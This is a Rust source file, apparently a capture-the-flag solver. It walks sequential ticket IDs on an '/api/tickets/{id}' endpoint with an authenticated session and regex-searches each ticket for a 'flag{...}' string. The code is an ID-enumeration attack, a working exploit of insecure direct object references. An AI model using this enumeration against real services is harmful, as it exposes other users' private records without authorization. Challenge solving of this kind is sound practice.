use bytes::Bytes;
use regex::Regex;
use reqwest::{Client, Error as ReqwestError, Url};
use serde::Deserialize;
use serde_json::from_slice as json_from_slice;
use std::sync::{
    Arc, OnceLock,
    atomic::{AtomicUsize, Ordering},
};
use thiserror::Error;
use tokio::sync::mpsc::{Receiver, Sender};

const BUFFER_CAPACITY_WARNING: usize = 4;

pub enum Scan {
    Success { flag: Box<str>, id: usize },
    Failure,
}

#[derive(Debug, Error)]
pub enum ScanError {
    #[error("{0}")]
    Io(#[from] ReqwestError),
    #[error("Unknown JSON schema: {0:?}")]
    UnknownSchema(Bytes),
    #[error("Server responded with an error: {0}")]
    Response(Box<str>),
}

#[derive(Clone, Debug, PartialEq, Eq, Hash, Deserialize)]
pub struct Ticket {
    id: usize,
    subject: Box<str>,
    description: Box<str>,
}

#[derive(Clone, Debug, PartialEq, Eq, Hash, Deserialize)]
struct ErrorResponse {
    error: Box<str>,
}

pub async fn fetch_tickets(
    tx: Sender<Result<Ticket, ScanError>>,
    client: Arc<Client>,
    index_url: Arc<Url>,
    counter: Arc<AtomicUsize>,
    verbose: bool,
) {
    loop {
        let id = counter.fetch_add(1, Ordering::SeqCst);
        if verbose {
            println!("Fetching ticket {id}...");
        }

        let ticket_url = index_url.join(&format!("/api/tickets/{id}")).unwrap();

        async fn fetch(client: &Client, url: Url) -> Result<Bytes, ReqwestError> {
            client.get(url).send().await?.bytes().await
        }

        fn check_capacity(verbose: bool, tx: &Sender<Result<Ticket, ScanError>>) {
            if verbose {
                let capacity = tx.capacity();
                if capacity <= BUFFER_CAPACITY_WARNING {
                    eprintln!("Buffer nearly full ({capacity} left).");
                }
            }
        }

        // If receiver has closed, these errors are not relevant anymore since the flag is found.
        match fetch(&client, ticket_url).await {
            Ok(bytes) => {
                if let Ok(ticket) = json_from_slice(&bytes) {
                    check_capacity(verbose, &tx);
                    if tx.send(Ok(ticket)).await.is_err() {
                        // Receiver has closed: flag is found.
                        break;
                    }
                } else if let Ok(ErrorResponse { error }) = json_from_slice(&bytes) {
                    match &*error {
                        // No more tickets: will be handled in `main`.
                        "Ticket not found" => break,
                        "Not authenticated" => panic!("Invalid session."),
                        _ => {
                            check_capacity(verbose, &tx);
                            _ = tx.send(Err(ScanError::Response(error)));
                        }
                    }
                } else {
                    check_capacity(verbose, &tx);
                    _ = tx.send(Err(ScanError::UnknownSchema(bytes)));
                }
            }
            Err(e) => {
                check_capacity(verbose, &tx);
                _ = tx.send(Err(e.into()))
            }
        }
    }
}

fn regex_flag(haystack: &str) -> Option<&str> {
    static R: OnceLock<Regex> = OnceLock::new();
    // We don't know the exact format of the flag contents, but we assume it at least doesn't contain
    // any '}' characters.
    R.get_or_init(|| Regex::new(r"flag\{(.*?)\}").unwrap())
        .captures(haystack)
        .map(|c| c.get(1).unwrap().as_str())
}

pub async fn process_tickets(
    mut rx: Receiver<Result<Ticket, ScanError>>,
) -> Result<Scan, ScanError> {
    while let Some(ticket) = rx.recv().await {
        let Ticket {
            id,
            subject,
            description,
        } = ticket?;
        if let Some(flag) = regex_flag(&subject).or_else(|| regex_flag(&description)) {
            return Ok(Scan::Success {
                flag: flag.into(),
                id,
            });
        }
    }

    Ok(Scan::Failure)
}
